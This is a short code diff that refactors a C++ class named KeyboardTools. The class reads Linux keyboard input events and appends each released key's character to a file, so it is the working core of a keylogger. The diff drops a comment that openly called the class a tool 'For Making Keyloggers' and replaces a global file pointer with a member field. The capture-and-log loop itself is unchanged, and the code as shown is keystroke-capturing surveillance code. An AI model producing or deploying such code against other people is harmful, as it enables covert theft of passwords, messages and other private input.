@@ -1,7 +1,3 @@
-FILE* __fpr;
-
-// Keyboard Class, For Making Keyloggers.
-
 class KeyboardTools{
     private:
 	FILE* outputfd;
@@ -41,7 +37,7 @@ class KeyboardTools{
                 return 0x00;
        }
        FILE* OutputTo(const char* file){
-		return (__fpr=(outputfd=fopen(file, "a")));
+		return (outputfd=fopen(file, "a"));
        }
 
        void Run(){
@@ -51,16 +47,16 @@ class KeyboardTools{
 			if (ie.type==EV_KEY && ie.value==0)
 				switch(ie.code){
 					case 28:
-						fprintf(__fpr, "\n");
+						fprintf(outputfd, "\n");
 						break;
 					case 57:
-						fprintf(__fpr, " ");
+						fprintf(outputfd, " ");
 						break;
 					default:
- 						fprintf(__fpr, "%c", map[ie.code]);
+ 						fprintf(outputfd, "%c", map[ie.code]);
 				}
 
-					fflush(__fpr);
+					fflush(outputfd);
 		}
        }
 
